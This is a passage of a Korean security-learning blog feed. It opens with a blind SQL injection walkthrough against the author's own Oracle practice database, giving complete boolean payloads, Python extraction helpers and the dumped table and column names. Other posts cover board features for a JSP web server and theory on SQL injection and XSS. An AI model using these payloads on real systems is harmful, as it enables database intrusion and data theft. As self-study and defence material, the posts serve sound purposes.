<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">all_tables</span> <span class="k">where</span> <span class="k">owner</span><span class="o">=</span><span class="s1">'C##DBFORPROB'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">tname</span> <span class="k">from</span> <span class="n">tab</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>

<span class="err">더</span> <span class="err">짧은</span> <span class="mi">2</span><span class="err">번째</span> <span class="err">공격</span> <span class="err">포맷을</span> <span class="err">이용하였다</span><span class="p">.</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 테이블 명 찾기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_name</span><span class="p">():</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select tname from tab"</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS
TEST
</code></pre></div></div>

<h2 id="컬럼-명-추출하기">컬럼 명 추출하기.</h2>
<ul>
  <li>테이블의 컬럼명을 추출하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>
<span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'TEST'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">cols</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s1">'MEMBERS'</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 컬럼 명 찾기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_column_name</span><span class="p">(</span><span class="n">table_name</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select column_name from cols where table_name='"</span><span class="o">+</span><span class="n">table_name</span><span class="o">+</span><span class="s">"'"</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 컬럼이름
SID
ID
PASSWORD
EMAIL
INFO
HASHPWD

TEST 컬럼이름
MSG
</code></pre></div></div>

<h2 id="데이터-추출하기">데이터 추출하기</h2>
<ul>
  <li>테이블에  저장되어 있는 데이터 추출하기.</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="err">컬럼이름</span> <span class="k">from</span> <span class="err">테이블명</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">;</span>

<span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="n">MSG</span> <span class="k">from</span> <span class="n">TEST</span> <span class="k">OFFSET</span> <span class="mi">0</span> <span class="k">ROWS</span> <span class="k">FETCH</span> <span class="k">NEXT</span> <span class="mi">1</span> <span class="k">ROWS</span> <span class="k">ONLY</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
</code></pre></div></div>

<ul>
  <li>파이썬 코드로 빠르게 데이터 추출하기.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_table_data</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table_name</span><span class="p">):</span>
<span class="err"> </span> <span class="err"> </span> <span class="n">query</span> <span class="o">=</span> <span class="s">"select "</span><span class="o">+</span><span class="n">column</span><span class="o">+</span><span class="s">" from "</span><span class="o">+</span><span class="n">table_name</span>
<span class="err"> </span> <span class="err"> </span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
</code></pre></div></div>

<ul>
  <li>추출한 데이터.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MEMBERS 데이터 추출
root
dad
user123
user2

TEST 데이터 추출
blind sql injection success
</code></pre></div></div>

<h2 id="결과">결과</h2>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/2b4957ca-e70d-4f4b-bd3e-01a45970eaaa" alt="Pasted image 20230512003709" /></p>

<h2 id="전체-코드">전체 코드</h2>
<script src="https://gist.github.com/MinGyu2/ed9926c11854380ea75abef3fbdfa4e5.js"></script>]]></content><author><name>Jung MinGyu</name></author><category term="Oracle DB" /><category term="Blind SQLi" /><category term="SQLi" /><category term="웹 해킹" /><summary type="html"><![CDATA[직접 Blind SQL Injection 을 시도해보자.]]></summary></entry><entry><title type="html">웹서버 만들기(11) 게시글 수정, 삭제, 검색</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/" rel="alternate" type="text/html" title="웹서버 만들기(11) 게시글 수정, 삭제, 검색" /><published>2023-05-10T00:00:00+09:00</published><updated>2023-05-10T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C11%EA%B2%8C%EC%8B%9C%EA%B8%80/"><![CDATA[<h2 id="게시글-수정">게시글 수정</h2>
<ul>
  <li>자기가 쓴 글만 수정이 가능하다.</li>
  <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼을 클릭하면 게시글 수정 페이지가 나타난다.</li>
  <li><code class="language-plaintext highlighter-rouge">수정하기</code>버튼은 자기가 쓴 게시글에만 표시가 된다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b1a6850c-b07e-4c20-826c-2224bccda626" alt="Pasted image 20230510145616" /></p>

<h3 id="수정하기-페이지">수정하기 페이지</h3>
<ul>
  <li>수정하기 버튼을 클릭하면 글을 수정할 수 있는 페이지가 나타난다.</li>
  <li>해당 페이지에는 현재 게시글의 제목과 본문이 적혀있다.</li>
  <li>내용을 수정하고 저장 버튼을 누르면 게시글을 수정할 수 있다.</li>
  <li>게시글 수정 페이지는 게시글 새로 작성하기와 코드가 동일하다. 단지 옛 게시글을 가져와 표시해준다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4652763b-44fc-4699-b1ce-6dcacab8f204" alt="Pasted image 20230510150536" /></p>

<h3 id="게시글-수정-저장-과정">게시글 수정 저장 과정</h3>
<ol>
  <li>자기가 쓴 글의 수정하기 페이지에 들어간다.</li>
  <li>내용을 수정하고 저장 버튼을 누른다.</li>
  <li>서버에서 옛날에 쓴 게시글은 삭제하고 새로운 게시글 형태로 저장한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-ICDshJzrsoQgOiDsiJjsoJUg7KCV67O0IOyghOuLrFxu7ISc67KEIC0-PiDshJzrsoQgOiDsiJjsoJUg7JqU7LKt7J6Q7JmAIOqyjOyLnOq4gCDsoIDsnpDqsIAg7J287LmY7ZWY64qU7KeAIO2ZleyduFxu7ISc67KEIC0-PiBEQiDshJzrsoQgOiDsmJsg6rKM7Iuc6riAIOyCreygnCDsmpTssq1cbkRCIOyEnOuyhCAtPj4g7ISc67KEIDog7JmE66OMXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOyDiOuhnOyatCDqsozsi5zquIAg7KCA7J6lIOyalOyyrVxuREIg7ISc67KEIC0-PiDshJzrsoQgOiDsmYTro4xcbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc6riAIO2OmOydtOyngOuhnCDrpqzri6TsnbTroIntirgiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="게시글-수정-전">게시글 수정 전</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/5c185a23-00ed-4809-85fa-7cbef5849e37" alt="Pasted image 20230510172026" /></p>

<h3 id="게시글-수정-후">게시글 수정 후</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/252dcf4a-f525-4b23-8163-fa613dcc1e6a" alt="Pasted image 20230510172058" /></p>

<h2 id="게시글-삭제">게시글 삭제</h2>
<ul>
  <li>자기가 쓴 글만 삭제가 가능하다.</li>
  <li><code class="language-plaintext highlighter-rouge">삭제하기</code>버튼을 누르면 게시글이 삭제된다.</li>
  <li><code class="language-plaintext highlighter-rouge">삭제하기</code>버튼은 자기가 쓴 게시글에만 표시가 된다.</li>
</ul>

<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/aa96aad4-ecec-40e3-a2bb-6d3d6f14a101" alt="Pasted image 20230510145618" /></p>

<h3 id="게시글-삭제-과정">게시글 삭제 과정</h3>
<ol>
  <li>자기가 쓴 게시글을 클릭하여 들어간다.</li>
  <li>삭제하기 버튼을 클릭한다.</li>
  <li>서버에서 게시글을 삭제한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG7shJzrsoQgLT4-IOyEnOuyhCA6IOyCreygnCDsmpTssq3snpDsmYAg6rKM7Iuc6riAIOyggOyekOqwgCDsnbzsuZjtlZjripTsp4Ag7ZmV7J24XG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOqyjOyLnOq4gCDsgq3soJwg7JqU7LKtXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOyZhOujjFxu7ISc67KEIC0-PiDsgqzsmqnsnpAgOiDqsozsi5zquIAg66qp66GdIO2OmOydtOyngOuhnCDrpqzri6TsnbTroIntirgiLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h3 id="게시글-삭제-전-db">게시글 삭제 전 DB</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/217f8cbe-2ba0-4523-8b8d-89735152c7c6" alt="Pasted image 20230510180241" /></p>

<h3 id="게시글-삭제-후-db">게시글 삭제 후 DB</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/29ca56bc-0173-4c34-a922-c21dce25d277" alt="Pasted image 20230510180336" /></p>

<h2 id="게시글-검색">게시글 검색</h2>
<ul>
  <li>제목 또는 본문에 일치하는 문장이 존재하면 게시글 목록에 나타난다.<br />
<img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/489ecabe-e9e2-47a6-b49b-2fb791f72dd9" alt="Pasted image 20230510180753" /></li>
</ul>

<h3 id="게시글-검색-과정">게시글 검색 과정</h3>
<ol>
  <li>검색바에 검색할 문장을 적어준다.</li>
  <li>엔터키를 눌러주면 서버로 검색 문장이 전송된다.</li>
  <li>서버에서 검색 문장과 일치하는 목록을 찾아 게시판 페이지를 완성하여 사용자에게 보내준다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOusuOyepeydhCDqsoDsg4ntlZzri6QuXG7shJzrsoQgLT4-IERCIOyEnOuyhCA6IOusuOyepeydtCDrk6TslrTqsIDripQg6rKM7Iuc7YyQIOuqqeuhneydhCDsmpTssq3tlZzri6QuXG5EQiDshJzrsoQgLT4-IOyEnOuyhCA6IOqyjOyLnO2MkCDrqqnroZ0g7J2R64u1Llxu7ISc67KEIC0-PiDshJzrsoQgOiDqsozsi5ztjJAg7Y6Y7J207KeAIOyZhOyEsS5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog6rKM7Iuc7YyQIO2OmOydtOyngCDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>

<h3 id="게시판-검색-전">게시판 검색 전</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/b363eda5-a151-46d4-a4f1-3bcb6ed13cf5" alt="Pasted image 20230510182928" /></p>

<h3 id="게시판-검색-후">게시판 검색 후</h3>
<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/e3aa24d0-93b3-40a2-83f0-6ab06983cfe7" alt="Pasted image 20230510182949" /></p>

<h2 id="코드">코드</h2>
<h3 id="jsp">JSP</h3>
<ul>
  <li>
    <p>notice.jsp 의 <code class="language-plaintext highlighter-rouge">수정하기</code> 및  <code class="language-plaintext highlighter-rouge">삭제하기</code> 버튼 부분.
<script src="https://gist.github.com/MinGyu2/39f0c8de5f8a66a31630dbeb16915406.js"></script></p>
  </li>
  <li>
    <p>notice_write.jsp 게시글 수정하기.
<script src="https://gist.github.com/MinGyu2/478e9223926016d77ec87888e6f62f27.js"></script></p>
  </li>
</ul>

<h3 id="servlet">Servlet</h3>
<ul>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 수정하기 페이지.
<script src="https://gist.github.com/MinGyu2/ee292b560cc05e016493d920407ef2dc.js"></script></p>
  </li>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 수정본 저장하기 버튼 눌렀을 때. 
<script src="https://gist.github.com/MinGyu2/d0fa86e9427cd19756eda75cf947b229.js"></script></p>
  </li>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 삭제하기 버튼 눌렀을 때.
<script src="https://gist.github.com/MinGyu2/20a4a375485e9aa2d629c11278935f94.js"></script></p>
  </li>
  <li>
    <p>MainPage.java 의 <code class="language-plaintext highlighter-rouge">uriSearch</code> 함수의 게시글 검색하기 버튼 눌렀을 때.
<script src="https://gist.github.com/MinGyu2/2e7bb12c785988dd7e4245d4e39d9387.js"></script></p>
  </li>
</ul>

<h2 id="웹-서버-전체-코드">웹 서버 전체 코드</h2>
<h3 id="jsp-1">JSP</h3>
<ul>
  <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
</ul>

<h3 id="servlet-1">servlet</h3>
<ul>
  <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="jsp" /><category term="servlet" /><category term="웹 서버" /><summary type="html"><![CDATA[게시글 수정, 삭제, 검색 기능 만들기.]]></summary></entry><entry><title type="html">SQL Injection 정리</title><link href="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/" rel="alternate" type="text/html" title="SQL Injection 정리" /><published>2023-05-08T00:00:00+09:00</published><updated>2023-05-08T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC</id><content type="html" xml:base="http://localhost:4000/SQLi%EC%A0%95%EB%A6%AC/"><![CDATA[<h2 id="sql-injection">SQL Injection</h2>

<h3 id="개념">개념</h3>
<ul>
  <li>임의의 SQL 질의문을 삽입해 실행하는 공격이다.</li>
</ul>

<h3 id="공격-피해">공격 피해</h3>

<h4 id="인증-우회">인증 우회</h4>
<ul>
  <li>입력에 SQL 질의문을 삽입하여 인증 우회를 한다.</li>
  <li>사용자가 입력한 값이 별도의 검증 과정 없이 서버의 SQL 문과 합쳐져 발생하는 문제이다.</li>
</ul>

<h4 id="데이터-추출">데이터 추출</h4>
<ul>
  <li>공격자가 원하는 정보를 DB에서 읽어올 수 있다.</li>
  <li>사용자가 입력한 값이 별도의 검증 과정 없이 서버의 SQL 문과 합쳐져 발생하는 문제이다.</li>
</ul>

<h4 id="데이터-변조">데이터 변조</h4>
<ul>
  <li>insert, delete, update 구문을 이용하여 DB 서버에 저장된 데이터를 변화시킨다.</li>
  <li>사용자가 입력한 값이 별도의 검증 과정 없이 서버의 SQL 문과 합쳐져 발생하는 문제이다.</li>
</ul>

<h4 id="web-shell">Web Shell</h4>
<ul>
  <li>업로드 취약점을 통하여 시스템에 명령을 내릴수 있는 코드를 말한다.</li>
  <li>SQL Injection 공격을 통해 악성코드를 업로드할 수 있다.</li>
  <li>하지만 웹 서버와 DB 서버가 물리적으로 분리되어 있다면 악성코드를 실행하기 힘들다.</li>
</ul>

<h3 id="공격-유형">공격 유형</h3>

<h4 id="union-sqli">Union SQLi</h4>
<ul>
  <li>union 문을 이용하여 select 문을 추가하고, 결과를 받아본다.</li>
</ul>

<h4 id="error-based-sqli">Error Based SQLi</h4>
<ul>
  <li>논리에러를 유발시킬 수 있는 특정 함수를 이용한다.</li>
</ul>

<h4 id="blind-sqli">Blind SQLi</h4>
<ul>
  <li>참과 거짓 조건을 이용해서 데이터 문자 하나씩 추출한다.</li>
</ul>

<h3 id="대응-방안">대응 방안</h3>
<ul>
  <li>Prepared Statement 를 이용하기. 단 order by, table 이름, column 이름에는 적용할 수 없다.</li>
  <li>화이트 리스트 필터링.(허락. 더 안전하다. ) 즉 정해놓은 애들만 들어올 수 있다.</li>
  <li>블랙 리스트 필터링. (금지) 금지한 명령어는 사용할 수 없다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://ko.wikipedia.org/wiki/%EC%9B%B9_%EC%85%B8">웹 셸 - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SQL Injection" /><summary type="html"><![CDATA[SQL Injection 간단하게 정리해보자.]]></summary></entry><entry><title type="html">XSS 이론</title><link href="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="XSS 이론" /><published>2023-05-07T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/XSS%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="xss">XSS</h2>
<h3 id="개념">개념</h3>
<ul>
  <li>클라우드 측 코드를 삽입하는 공격이다.</li>
  <li>클라이언트의 브라우저에서 실행된다.</li>
  <li>피해자 컴퓨터(브라우저)에 악의적인 코드를 실행되게 하는 공격이다.</li>
  <li>Cross-site Scripting 의 약자이다.</li>
  <li>개발자가 고려하지 않는 기능을 동작시킨다.</li>
</ul>

<h3 id="poc-코드">POC 코드</h3>
<ul>
  <li>alert(1)</li>
  <li>console.log()</li>
  <li>“임이의 클라이언트 측 코드가 동작한다.” 를 보여주면 된다.</li>
</ul>

<h3 id="공격-방식">공격 방식</h3>
<h4 id="script-태그-이용하기">script 태그 이용하기.</h4>
<script src="https://gist.github.com/MinGyu2/ba046742127493f07bd950b19c8cd123.js"></script>

<h4 id="onerror-속성-이용하기">onerror 속성 이용하기.</h4>
<ul>
  <li>자바스크립트 태그 안에 있는 효과와 동일하다.</li>
</ul>

<script src="https://gist.github.com/MinGyu2/94420c775fba67aeb3ff11335bc32fa0.js"></script>

<h3 id="공격-피해">공격 피해</h3>

<h4 id="사용자-쿠키-탈취">사용자 쿠키 탈취</h4>
<ul>
  <li>document.cookie 를 활용하여 사용자 쿠키 값을 훔친다.</li>
  <li>사용자 브라우저의 쿠키에 저장된 합법적인 <strong>Session ID 값</strong>이나 <strong>액세스 토큰 값</strong>을 훔쳐 원격지 서버로 전송한다.</li>
</ul>

<h4 id="사용자-개인정보-탈취">사용자 개인정보 탈취</h4>
<ul>
  <li>Key Logger 방식으로 사용자 입력을 탈취한다.</li>
  <li>XSS Keylog 가 삽입된 페이지에 사용자가 접근하면 Keyboard Event 를 통해 입력 값을 후킹한다.</li>
  <li>후킹한 값을 원격지 서버로 전송한다.</li>
</ul>

<h4 id="악성코드-다운로드">악성코드 다운로드</h4>
<ul>
  <li>사용자가 악성 스크립트가 있는 URL을 클릭하도록 유도하여 악성 프로그램 다운로드 받는 사이트로 리타이렉한다.</li>
  <li>사용자가 악성 프로그램을 다운로드 하도록 유도한다.</li>
</ul>

<h4 id="피싱-사이트-강제-이동">피싱 사이트 강제 이동</h4>
<ul>
  <li>가짜 사이트로 위장하여 사용자의 로그인 정보를 탈취한다.</li>
  <li>실제 사이트와 유사한 웹 페이지를 통해 사용자의 개인정보를 훔쳐올 수 있다.</li>
</ul>

<h3 id="공격-유형">공격 유형</h3>

<h4 id="stored-xss--서버에-저장하기-">Stored XSS ( 서버에 저장하기 )</h4>

<h5 id="설명">설명</h5>
<ul>
  <li>비정상적인 방법이 아니라 서버에서 제공하는 서비스의 취약점을 이용한 것이다.</li>
  <li>공격자가 악성 스크립트를 서버 페이지에 저장하고 해당 페이지를 사용자에게 노출 시킨다.</li>
  <li>사용자가 악성 스크립트가 들어있는 페이지를 방문하면 악성 스크립트가 사용자 브라우저에서 실행된다.</li>
  <li>광역적으로 공격이 가능하다. 하지만 흔적이 남는다.</li>
</ul>

<h5 id="유형">유형</h5>
<ul>
  <li>댓글</li>
  <li>게시판</li>
  <li>이메일</li>
  <li>블로그 포스</li>
  <li>채팅방의 유저 이름</li>
</ul>

<h5 id="과정">과정</h5>
<ol>
  <li>XSS 취약점이 있는 게시판에 쿠키 정보를 탈취하기 위한 악성 스크립트를 포함한 게시물을 작성한다.</li>
  <li>사용자가 해당 글 열람 시 사용자의 쿠키 정보가 공격자에게 전송된다.</li>
  <li>공격자가 사용자의 쿠키정보를 이용하여 사이트에 접근한다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOyVheyEsSDsiqTtgazrpr3tirjrpbwg64Sj7J2AIOqyjOyLnOq4gOydhCDsnpHshLHtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOyVheyEsSDsiqTtgazrpr3tirjqsIAg7J6I64qUIOqyjOyLnOq4gOydhCDsmpTssq3tlZzri6QuXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjqsIAg7J6I64qUIOqyjOyLnOq4gOydhCDsnZHri7XtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOyCrOyaqeyekCA6IOyVheyEsSDsiqTtgazrpr3tirjqsIAg64-Z7J6R7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDqs7XqsqnsnpAgOiDrr7zqsJDtlZwg642w7J207YSwIOyghOyGoe2VnOuLpC4iLCJtZXJtYWlkIjpudWxsfQ" /></p>

<h4 id="reflected-xss">Reflected XSS</h4>

<h5 id="설명-1">설명</h5>
<ul>
  <li>서버 사이드 렌더링(SSR)</li>
  <li>무조건 GET 방식 이여야 한다.</li>
  <li>악성 스크립트가 담긴 URL을 만들어 일반 사용자에게 전달한다.</li>
  <li>URL 주소 뒤에 붙는 쿼리에 악성 스크립트를 작성하여 전달한다.</li>
  <li>사용자가 공격자가 건네준 URL을 클릭하여 방문하면 악성 스크립트가 담긴 페이지를 사용자에게 보여준다. 그리고 사용자 브라우저에서 악성 스크립트가 실행된다.</li>
</ul>

<h5 id="유형-1">유형</h5>
<ul>
  <li>이메일</li>
</ul>

<h5 id="과정-1">과정</h5>
<ol>
  <li>XSS 취약한 서버 URL와 악성 스크립트를 합쳐서 만든 링크를 사용자에게 보낸다.</li>
  <li>사용자가 링크를 클릭하면 취약한 서버에 악성 스크립트랑 같이 요청을 보낸다.</li>
  <li>사용자는 서버로 부터 응답을 받는다. 이때 받은 페이지는 서버에서 완성된 페이지이고 악성 스크립트가 담겨져 있다.</li>
  <li>사용자 브라우저는 악성 스크립트를 동작시킨다.</li>
  <li>공격자는 사용자의 민감한 정보를 훔칠 수 있다.</li>
</ol>

<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyCrOyaqeyekCA6IFVSTCArIOyVheyEsSDsiqTtgazrpr3tirjsnYQg67O064K464ukLlxu7IKs7Jqp7J6QIC0-PiDsgqzsmqnsnpAgOiBVUkzsnYQg7YG066at7ZWc64ukLlxu7IKs7Jqp7J6QIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Drpbwg7JqU7LKt7ZWc64ukLlxu7ISc67KEIC0-PiDshJzrsoQgOiDslYXshLEg7Iqk7YGs66a97Yq466W8IOuEo-ydgCDtjpjsnbTsp4Drpbwg7JmE7ISxIOyLnO2CqOuLpC5cbuyEnOuyhCAtPj4g7IKs7Jqp7J6QIDog7Y6Y7J207KeA66W8IOydkeuLte2VnOuLpC5cbuyCrOyaqeyekCAtPj4g7IKs7Jqp7J6QIDog7JWF7ISxIOyKpO2BrOumve2KuOqwgCDrj5nsnpHtlZzri6QuXG7sgqzsmqnsnpAgLT4-IOqzteqyqeyekCA6IOuvvOqwkO2VnCDrjbDsnbTthLDrpbwg7KCE7Iah7ZWc64ukLiIsIm1lcm1haWQiOm51bGx9" /></p>

<h4 id="dom-based-xss">DOM Based XSS</h4>

<h5 id="설명-2">설명</h5>
<ul>
  <li>클라이언트 사이드 렌더링(CSR)</li>
  <li>JavaScript 코드로 DOM 객체를 제어하는 과정에서 발생한다.</li>
  <li>악성 스크립트가 서버로 전송되지 않고, 브라우저에서 동적으로 동작한다.</li>
  <li>웹 사이트 코드를 조사하지 않고는 취약점을 발견할 수 없다. 따라서 공격 당하기 쉽다.</li>
  <li>url에 사용자가 접근할 경우 서버와의 상호작용 없이 브라우저에서 악성 스크립트가 실행된다.</li>
  <li>DOM 이 만들어지고 화면에 렌더링 된 이후, 악성 스크립트 코드에 의해 DOM 구조가 동적으로 바뀐다.</li>
</ul>

<h5 id="과정-2">과정</h5>
<ol>
  <li>악성 스크립트가 실행되도록 URL 주소를 만들어 사용자에게 전달한다.</li>
  <li>사용자는 링크를 클릭하여 서버에 페이지를 요청하고 서버는 사용자에게 페이지를 넘겨준다.</li>
